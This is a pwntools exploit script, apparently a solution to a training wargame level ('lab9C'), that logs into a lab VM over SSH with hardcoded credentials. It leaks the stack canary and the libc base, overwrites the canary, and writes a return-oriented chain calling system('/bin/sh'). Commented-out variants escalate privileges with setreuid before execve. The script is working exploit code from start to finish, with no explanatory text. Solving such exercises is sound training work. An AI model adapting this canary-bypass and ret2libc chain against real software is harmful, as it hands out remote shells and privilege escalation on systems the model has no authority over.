
import sys
import time
import struct

from pwn import *

def main():

  session = ssh(host="192.168.159.129", user="lab9C", password="lab09start")
  sh = session.process("/bin/sh", env={"PS1":""})
  sendget(sh, "/levels/lab09/lab9C")

  cookie = leak_cookie(sh)
  log.info("Successfully leaked stack cookie: 0x%x" % cookie)

  libc_base = leak_libc(sh)
  log.info("Successfully leaked libc base pointer: 0x%x" % libc_base)
  
  exploit(sh, cookie, libc_base)

  sh.interactive()

# exploit:
def exploit(sh, cookie, libc_base):

  log.info("Overwriting stack canary")
  for i in range(256):
    sendget(sh, "1")
    sendget(sh, "1094795585")
  sendget(sh, "1")
  sendget(sh, ("%d" % cookie))

  log.info("Writing exploit buffer")
  generate_rop_chain(sh, libc_base)

  log.info("Exploitation complete, triggering")
  sendget(sh, "3")

  return

# generate_rop_chain: generates rop chain using write vuln
def generate_rop_chain(sh, base):

  rop_gadgets = [
    # ROP NOP into the ropchain(s)
#    base+0x417,    # ret [libc-2.19.so]
    base+0x417,    # ret [libc-2.19.so]
    base+0x417,    # ret [libc-2.19.so]
    base+0x417,    # ret [libc-2.19.so]
    # direct system call
    base+0x40190, # *system -> __libc_system
    0x00000000,
    base+0x160a24, # *ptr -> "/bin/sh"
    # setreuid(1034, 1034) -> /etc/passwd -> lab9A
#    base+0x2469f,  # pop eax; ret [libc-2.19.so]
#    0x00000046,    # setreuid syscall number
#    base+0x198ce,  # pop ebx; ret [libc-2.19.so]
#    0x0000040a,    # lab9A ruid (id -u lab9A)
#    base+0x2e3cb,  # pop ecx; pop edx; ret; [libc-2.19.so]
#    0x0000040b,    # lab9A guid (id -g lan9A)
#    0x41414141,    # filler
#    base+0xebac1,  # int 0x80; pop ebp; pop edi; pop esi; pop ebx; ret [libc-2.19.so]
#    0x41414141,    # filler
#    0x41414141,    # filler
#    0x41414141,    # filler
#    0x41414141,    # filler
    # execve("/bin/sh", 0, 0)
#    base+0x2469f,  # pop eax; ret [libc-2.19.so]
#    0x0000000b,    # execve syscall number
#    base+0x198ce,  # pop ebx; ret [libc-2.19.so]
#    base+0x160a24, # *ptr -> "/bin/sh"
#    base+0x2e3cb,  # pop ecx; pop edx; ret; [libc-2.19.so]
#    0x00000000,    # zero out
#    0x00000000,    # zero out
#    base+0x2e6a5,  # int 0x80 [libc-2.19.so]
  ]

  for i in range(len(rop_gadgets)):
    write_gadget(sh, rop_gadgets[i])

  return

# write_gadget: writes a gadget (less code)
def write_gadget(sh, gadget):

  sendget(sh, "1")
  sendget(sh, ("%d" % gadget))

  return

# leak_libc: leak a pointer to libc, must add 0x100000000 to properly parse leak
def leak_libc(sh):

  sendget(sh, "2")
  data = sendget(sh, "4", True)
  libc = int(data.split(b' ')[2].split(b'\n')[0]) + 0x100000000

  return libc-0x2034

# leak_cookie: leak the stack cookie, nothing special needed to extract cookie
def leak_cookie(sh):

  sendget(sh, "2")
  data = sendget(sh, "257", True)
  canary = int(data.split(b' ')[2].split(b'\n')[0])

  if canary < 0:
    log.warn("Failed to capture canary run again")
    exit(-1)

  return canary

# sendget: send bytes and retrieve bytes (less code if in function)
def sendget(sh, message, print_output=False):

  sh.sendline(message)
  if print_output == False:
    sh.read()
  else:
    return sh.read()

  return

main()
